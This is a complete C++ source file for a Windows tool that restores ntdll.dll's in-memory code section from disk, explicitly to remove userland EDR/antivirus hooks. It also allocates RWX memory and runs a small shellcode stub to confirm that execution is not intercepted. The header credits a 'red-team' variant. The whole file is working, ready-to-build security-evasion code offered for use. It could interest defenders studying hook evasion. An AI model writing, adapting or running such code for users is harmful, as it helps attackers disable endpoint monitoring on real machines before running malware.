// ============================================================================
// ntdll_unhook.cpp
//
// Restores the in-memory .text section of ntdll.dll to its on-disk state,
// removing userland EDR/AV hooks.
//
// Merged from two prior implementations:
//   - Robust PE validation, size reconciliation, cache flush, and
//     shellcode verification from the "defensive" variant.
//   - Memory-mapped source I/O and clean functional structure from the
//     "red-team" variant.
//
// Build (MSVC):
//   cl /O2 /W4 /EHsc /DUNICODE /D_UNICODE ntdll_unhook.cpp /Fe:ntdll_unhook.exe
// Build (MinGW):
//   g++ -O2 -Wall -o ntdll_unhook ntdll_unhook.cpp -static
//
// Usage:
//   ntdll_unhook.exe            -- perform unhook + verification
//   ntdll_unhook.exe --dry-run  -- validate only, no modification
// ============================================================================

#include <windows.h>
#include <cstring>
#include <cstdint>
#include <cstdio>

#ifdef _MSC_VER
    #pragma comment(lib, "kernel32.lib")
#endif

// ---------------------------------------------------------------------------
// Error taxonomy
// ---------------------------------------------------------------------------
enum class Err : int {
    Ok                =  0,
    OpenFailed        = -1,
    MapFailed         = -2,
    BadDosHeader      = -3,
    BadNtSignature    = -4,
    BadOptionalHeader = -5,
    SectionNotFound   = -6,
    VersionMismatch   = -7,
    ProtectFailed     = -8,
    CopyFailed        = -9,
    FlushFailed       = -10,
    VerifyFailed      = -11,
    AllocFailed       = -12,
    ExecFailed        = -13,
};

static const char* ErrStr(Err e) {
    switch (e) {
        case Err::Ok:                return "OK";
        case Err::OpenFailed:        return "Failed to open file";
        case Err::MapFailed:         return "Failed to map file";
        case Err::BadDosHeader:      return "Invalid DOS header";
        case Err::BadNtSignature:    return "Invalid NT signature";
        case Err::BadOptionalHeader: return "Invalid optional header";
        case Err::SectionNotFound:   return "Target section not found";
        case Err::VersionMismatch:   return "Disk and loaded ntdll versions differ";
        case Err::ProtectFailed:     return "VirtualProtect failed";
        case Err::CopyFailed:        return "memcpy / integrity check failed";
        case Err::FlushFailed:       return "FlushInstructionCache failed";
        case Err::VerifyFailed:      return "Shellcode verification failed";
        case Err::AllocFailed:       return "VirtualAlloc failed";
        case Err::ExecFailed:        return "Execution / flag check failed";
        default:                     return "Unknown";
    }
}

// ---------------------------------------------------------------------------
// Section descriptor
// ---------------------------------------------------------------------------
struct SectionInfo {
    DWORD   rva;
    SIZE_T  virtualSize;
    DWORD   rawOffset;
    SIZE_T  rawSize;
    DWORD   characteristics;
    char    name[9];  // 8 bytes + NUL
};

// ---------------------------------------------------------------------------
// PE validation + section lookup
//
// Returns the section info on success. Validates DOS magic, e_lfanew bounds,
// NT signature, and optional-header magic. Falls back to the first section
// marked IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE if the named section
// is absent (handles renamed sections in patched builds).
// ---------------------------------------------------------------------------
static Err FindSection(const BYTE* base, SIZE_T fileSize,
                       const char* wanted, SectionInfo& out)
{
    // --- DOS header ---
    if (fileSize < sizeof(IMAGE_DOS_HEADER))
        return Err::BadDosHeader;
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return Err::BadDosHeader;
    if (dos->e_lfanew <= 0 ||
        dos->e_lfanew > 0xFFFF ||
        static_cast<SIZE_T>(dos->e_lfanew) >= fileSize)
        return Err::BadDosHeader;

    const SIZE_T ntOff = static_cast<SIZE_T>(dos->e_lfanew);

    // --- NT signature ---
    if (ntOff + 4 > fileSize)
        return Err::BadNtSignature;
    DWORD sig = *reinterpret_cast<const DWORD*>(base + ntOff);
    if (sig != IMAGE_NT_SIGNATURE)
        return Err::BadNtSignature;

    // --- File header ---
    if (ntOff + 4 + sizeof(IMAGE_FILE_HEADER) > fileSize)
        return Err::BadNtSignature;
    const auto* fh = reinterpret_cast<const IMAGE_FILE_HEADER*>(base + ntOff + 4);

    // --- Optional header (just read the magic) ---
    const SIZE_T optOff = ntOff + 4 + sizeof(IMAGE_FILE_HEADER);
    if (optOff + 2 > fileSize)
        return Err::BadOptionalHeader;
    WORD magic = *reinterpret_cast<const WORD*>(base + optOff);
    if (magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC &&
        magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        return Err::BadOptionalHeader;

    // --- Section table ---
    if (optOff + fh->SizeOfOptionalHeader +
        sizeof(IMAGE_SECTION_HEADER) * fh->NumberOfSections > fileSize)
        return Err::BadOptionalHeader;

    const auto* sections = reinterpret_cast<const IMAGE_SECTION_HEADER*>(
        base + optOff + fh->SizeOfOptionalHeader);

    const size_t nameLen = std::strlen(wanted) + 1;

    // Pass 1: exact name match
    for (WORD i = 0; i < fh->NumberOfSections; ++i) {
        if (std::memcmp(sections[i].Name, wanted, nameLen) == 0) {
            out.rva             = sections[i].VirtualAddress;
            out.virtualSize     = sections[i].Misc.VirtualSize
                                 ? sections[i].Misc.VirtualSize
                                 : sections[i].SizeOfRawData;
            out.rawOffset       = sections[i].PointerToRawData;
            out.rawSize         = sections[i].SizeOfRawData;
            out.characteristics = sections[i].Characteristics;
            std::memcpy(out.name, sections[i].Name, 9);
            out.name[8] = '\0';
            return Err::Ok;
        }
    }

    // Pass 2: first executable / code section (fallback)
    for (WORD i = 0; i < fh->NumberOfSections; ++i) {
        if ((sections[i].Characteristics & IMAGE_SCN_CNT_CODE) ||
            (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            out.rva             = sections[i].VirtualAddress;
            out.virtualSize     = sections[i].Misc.VirtualSize
                                 ? sections[i].Misc.VirtualSize
                                 : sections[i].SizeOfRawData;
            out.rawOffset       = sections[i].PointerToRawData;
            out.rawSize         = sections[i].SizeOfRawData;
            out.characteristics = sections[i].Characteristics;
            std::memcpy(out.name, sections[i].Name, 9);
            out.name[8] = '\0';
            return Err::Ok;
        }
    }

    return Err::SectionNotFound;
}

// ---------------------------------------------------------------------------
// Version compatibility check
//
// Ensures the on-disk and loaded ntdll images share the same section layout
// so that a raw memcpy is semantically valid. Compares section count and
// per-section (VA, VirtualSize, SizeOfRawData).
// ---------------------------------------------------------------------------
static Err CheckSectionCompat(const BYTE* diskBase, SIZE_T diskSize,
                              const BYTE* loadBase)
{
    // Quick re-parse to get section tables (we already validated the loaded
    // image in FindSection; here we just need the raw tables).
    const auto* dosD = reinterpret_cast<const IMAGE_DOS_HEADER*>(diskBase);
    const auto* dosL = reinterpret_cast<const IMAGE_DOS_HEADER*>(loadBase);

    const SIZE_T ntD = static_cast<SIZE_T>(dosD->e_lfanew);
    const SIZE_T ntL = static_cast<SIZE_T>(dosL->e_lfanew);

    const auto* fhD = reinterpret_cast<const IMAGE_FILE_HEADER*>(diskBase + ntD + 4);
    const auto* fhL = reinterpret_cast<const IMAGE_FILE_HEADER*>(loadBase + ntL + 4);

    if (fhD->NumberOfSections != fhL->NumberOfSections)
        return Err::VersionMismatch;

    const auto* secD = reinterpret_cast<const IMAGE_SECTION_HEADER*>(
        diskBase + ntD + 4 + sizeof(IMAGE_FILE_HEADER) + fhD->SizeOfOptionalHeader);
    const auto* secL = reinterpret_cast<const IMAGE_SECTION_HEADER*>(
        loadBase + ntL + 4 + sizeof(IMAGE_FILE_HEADER) + fhL->SizeOfOptionalHeader);

    for (WORD i = 0; i < fhD->NumberOfSections; ++i) {
        if (secD[i].VirtualAddress != secL[i].VirtualAddress)
            return Err::VersionMismatch;
        if (secD[i].Misc.VirtualSize != secL[i].Misc.VirtualSize)
            return Err::VersionMismatch;
    }

    return Err::Ok;
}

// ---------------------------------------------------------------------------
// Open + memory-map the on-disk ntdll.dll
// ---------------------------------------------------------------------------
static Err MapDiskNtdll(const wchar_t* path,
                        const BYTE** outView, SIZE_T* outSize,
                        HANDLE* outFile, HANDLE* outMapping)
{
    *outView    = nullptr;
    *outSize    = 0;
    *outFile    = INVALID_HANDLE_VALUE;
    *outMapping = INVALID_HANDLE_VALUE;

    HANDLE hFile = CreateFileW(
        path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
        return Err::OpenFailed;

    LARGE_INTEGER sz;
    if (!GetFileSizeEx(hFile, &sz) || sz.QuadPart <= 0) {
        CloseHandle(hFile);
        return Err::OpenFailed;
    }

    HANDLE hMap = CreateFileMappingW(
        hFile, nullptr, PAGE_READONLY,
        static_cast<DWORD>(sz.HighPart), static_cast<DWORD>(sz.LowPart),
        nullptr);
    if (!hMap) {
        CloseHandle(hFile);
        return Err::MapFailed;
    }

    const BYTE* view = static_cast<const BYTE*>(
        MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0));
    if (!view) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return Err::MapFailed;
    }

    *outView    = view;
    *outSize    = static_cast<SIZE_T>(sz.QuadPart);
    *outFile    = hFile;
    *outMapping = hMap;
    return Err::Ok;
}

static void UnmapDiskNtdll(HANDLE hFile, HANDLE hMapping, const BYTE* view)
{
    if (view)       UnmapViewOfFile(view);
    if (hMapping != INVALID_HANDLE_VALUE) CloseHandle(hMapping);
    if (hFile   != INVALID_HANDLE_VALUE) CloseHandle(hFile);
}

// ---------------------------------------------------------------------------
// The core unhook: overwrite loaded .text with disk .text
// ---------------------------------------------------------------------------
static Err PerformUnhook(const BYTE* diskBase, SIZE_T diskSize,
                         const SectionInfo& diskSec,
                         BYTE* loadedBase,
                         const SectionInfo& loadSec,
                         bool dryRun)
{
    // --- Size reconciliation (the critical part) ---
    //
    // Destination region:  loadedBase + loadSec.rva,  size = loadSec.virtualSize
    // Source region:       diskBase + diskSec.rawOffset, size = diskSec.rawSize
    //
    // We must never write more than the destination can hold, and never read
    // past the source file.
    const SIZE_T destSize = loadSec.virtualSize
                          ? loadSec.virtualSize
                          : loadSec.rawSize;

    SIZE_T copySize = (destSize < diskSec.rawSize) ? destSize : diskSec.rawSize;

    // Clamp to file boundary
    if (static_cast<UINT_PTR>(diskSec.rawOffset) + copySize > diskSize)
        copySize = static_cast<SIZE_T>(diskSize - diskSec.rawOffset);

    if (copySize == 0)
        return Err::CopyFailed;

    const BYTE* src = diskBase + diskSec.rawOffset;
    BYTE*       dst = loadedBase + loadSec.rva;

    if (dryRun) {
        printf("[dry-run] Would overwrite %zu bytes at %p (VA 0x%08X)\n",
               copySize, dst, loadSec.rva);
        printf("[dry-run] Source: offset 0x%08X, %zu bytes on disk\n",
               diskSec.rawOffset, diskSec.rawSize);
        return Err::Ok;
    }

    // --- Change protection ---
    DWORD oldProtect = 0;
    if (!VirtualProtect(dst, destSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return Err::ProtectFailed;
    }

    // --- Copy ---
    std::memcpy(dst, src, copySize);

    // Zero-fill the gap between raw and virtual size (matches loader behaviour)
    if (destSize > copySize)
        std::memset(dst + copySize, 0, destSize - copySize);

    // --- Post-copy integrity check ---
    // Verify the first and last 64 bytes match the source. Catches the
    // (theoretical) case where a concurrent write clobbered the region.
    const SIZE_T checkLen = (copySize < 64) ? copySize : 64;
    if (std::memcmp(dst, src, checkLen) != 0 ||
        std::memcmp(dst + copySize - checkLen,
                    src + copySize - checkLen, checkLen) != 0) {
        VirtualProtect(dst, destSize, oldProtect, &oldProtect);
        return Err::CopyFailed;
    }

    // --- Restore protection ---
    // Guarantee at least an execute bit is present after restore.
    DWORD restore = oldProtect;
    if (!(restore & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
                     PAGE_EXECUTE_WRITECOPY))) {
        restore = PAGE_EXECUTE_READ;
    }
    DWORD tmp = 0;
    VirtualProtect(dst, destSize, restore, &tmp);

    // --- Flush instruction cache ---
    // Critical: without this, other cores may still execute stale (hooked)
    // bytes from their L1/I-cache.
    if (!FlushInstructionCache(GetCurrentProcess(), dst, destSize)) {
        return Err::FlushFailed;
    }

    printf("[unhook] Patched %zu bytes at %p (VA 0x%08X)\n",
           copySize, dst, loadSec.rva);
    return Err::Ok;
}

// ---------------------------------------------------------------------------
// Execution-verification shellcode
//
// Allocates a small RWX region, writes a 2-instruction payload that stores
// 0xDEADBEEF to a known offset within the same region, executes it, then
// reads the flag back. Proves the CPU is actually dispatching our bytes
// (i.e. no remaining hook is intercepting execution).
// ---------------------------------------------------------------------------
static Err VerifyExecution()
{
    constexpr SIZE_T kRegionSize   = 0x100;
    constexpr SIZE_T kFlagOffset   = 0x80;
    constexpr DWORD  kMagic        = 0xDEADBEEF;

    LPVOID mem = VirtualAlloc(nullptr, kRegionSize,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) return Err::AllocFailed;

    BYTE* base = static_cast<BYTE*>(mem);

#if defined(_M_X64) || defined(__x86_64__)
    //  mov eax, 0xDEADBEEF
    //  mov [rip+disp32], rax
    //  ret
    static BYTE payload[] = {
        0xB8, 0xEF, 0xBE, 0xAD, 0xDE,   // mov eax, 0xDEADBEEF
        0x48, 0x89, 0x05,               // mov [rip+disp32], rax
        0x00, 0x00, 0x00, 0x00,         // disp32 (patched below)
        0xC3                            // ret
    };
    // After the 3-byte opcode (0x48 0x89 0x05) the RIP points to
    // payload + 3 + 4 = payload + 7.  We want [rip+disp] == base+kFlagOffset.
    const SIZE_T nextIp = 12;  // 5 + 3 + 4 = 12 bytes into payload
    int32_t disp = static_cast<int32_t>(
        static_cast<long long>(kFlagOffset) - static_cast<long long>(nextIp));
    std::memcpy(payload + 8, &disp, sizeof(disp));

#elif defined(_M_IX86) || defined(__i386__)
    //  mov eax, 0xDEADBEEF
    //  mov ecx, <abs addr>
    //  mov [ecx], eax
    //  ret
    static BYTE payload[] = {
        0xB8, 0xEF, 0xBE, 0xAD, 0xDE,   // mov eax, 0xDEADBEEF
        0xB9,                           // mov ecx, imm32
        0x00, 0x00, 0x00, 0x00,         // abs addr (patched below)
        0x89, 0x01,                     // mov [ecx], eax
        0xC3                           // ret
    };
    DWORD absAddr = static_cast<DWORD>(
        reinterpret_cast<UINT_PTR>(mem) + kFlagOffset);
    std::memcpy(payload + 6, &absAddr, sizeof(absAddr));

#else
    // Unsupported architecture: skip verification
    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[verify] Skipped (unsupported arch)\n");
    return Err::Ok;
#endif

    std::memcpy(base, payload, sizeof(payload));

    if (!FlushInstructionCache(GetCurrentProcess(), mem, kRegionSize)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return Err::FlushFailed;
    }

    // Execute
    typedef void (*Fn)();
    auto fn = reinterpret_cast<Fn>(mem);
    fn();

    MemoryBarrier();

    DWORD flag = *reinterpret_cast<volatile DWORD*>(base + kFlagOffset);
    VirtualFree(mem, 0, MEM_RELEASE);

    if (flag != kMagic) {
        printf("[verify] FAILED: expected 0x%08X, got 0x%08X\n", kMagic, flag);
        return Err::ExecFailed;
    }

    printf("[verify] OK: shellcode executed, flag = 0x%08X\n", flag);
    return Err::Ok;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main(int argc, char* argv[])
{
    const bool dryRun = (argc > 1 &&
                         (std::strcmp(argv[1], "--dry-run") == 0 ||
                          std::strcmp(argv[1], "-n") == 0));

    printf("=== NTDLL Unhook %s ===\n", dryRun ? "[DRY RUN]" : "[LIVE]");

    // 1. Locate loaded ntdll
    HMODULE hNtdll = GetModuleHandleW(L"NTDLL.DLL");
    if (!hNtdll) {
        fprintf(stderr, "[-] GetModuleHandleW(NTDLL.DLL) failed (err %lu)\n",
                GetLastError());
        return static_cast<int>(Err::OpenFailed);
    }
    BYTE* loadedBase = reinterpret_cast<BYTE*>(hNtdll);
    printf("[+] Loaded ntdll base: 0x%p\n", loadedBase);

    // 2. Map disk copy
    const wchar_t kPath[] = L"C:\\Windows\\System32\\ntdll.dll";
    const BYTE* diskView = nullptr;
    SIZE_T      diskSize = 0;
    HANDLE      hFile    = INVALID_HANDLE_VALUE;
    HANDLE      hMap     = INVALID_HANDLE_VALUE;

    Err e = MapDiskNtdll(kPath, &diskView, &diskSize, &hFile, &hMap);
    if (e != Err::Ok) {
        fprintf(stderr, "[-] %s\n", ErrStr(e));
        return static_cast<int>(e);
    }
    printf("[+] Mapped disk ntdll: %zu bytes\n", diskSize);

    // 3. Find .text in both images
    SectionInfo loadSec, diskSec;
    e = FindSection(loadedBase, /*fileSize=*/0xFFFF'FFFF, ".text", loadSec);
    if (e != Err::Ok) {
        fprintf(stderr, "[-] Loaded: %s\n", ErrStr(e));
        UnmapDiskNtdll(hFile, hMap, diskView);
        return static_cast<int>(e);
    }
    e = FindSection(diskView, diskSize, ".text", diskSec);
    if (e != Err::Ok) {
        fprintf(stderr, "[-] Disk: %s\n", ErrStr(e));
        UnmapDiskNtdll(hFile, hMap, diskView);
        return static_cast<int>(e);
    }
    printf("[+] Section: \"%s\"  VA=0x%08X  vsize=%zu  rawOff=0x%08X  rawSize=%zu\n",
           loadSec.name, loadSec.rva, loadSec.virtualSize,
           diskSec.rawOffset, diskSec.rawSize);

    // 4. Version compatibility
    e = CheckSectionCompat(diskView, diskSize, loadedBase);
    if (e != Err::Ok) {
        fprintf(stderr, "[-] %s — aborting to avoid corruption\n", ErrStr(e));
        UnmapDiskNtdll(hFile, hMap, diskView);
        return static_cast<int>(e);
    }
    printf("[+] Section layout matches between disk and loaded image\n");

    // 5. Perform the overwrite
    e = PerformUnhook(diskView, diskSize, diskSec, loadedBase, loadSec, dryRun);
    if (e != Err::Ok) {
        fprintf(stderr, "[-] %s\n", ErrStr(e));
        UnmapDiskNtdll(hFile, hMap, diskView);
        return static_cast<int>(e);
    }

    // 6. Verify execution environment
    if (!dryRun) {
        e = VerifyExecution();
        if (e != Err::Ok) {
            fprintf(stderr, "[-] %s\n", ErrStr(e));
            UnmapDiskNtdll(hFile, hMap, diskView);
            return static_cast<int>(e);
        }
    }

    UnmapDiskNtdll(hFile, hMap, diskView);

    printf("=== Done ===\n");
    return 0;
}
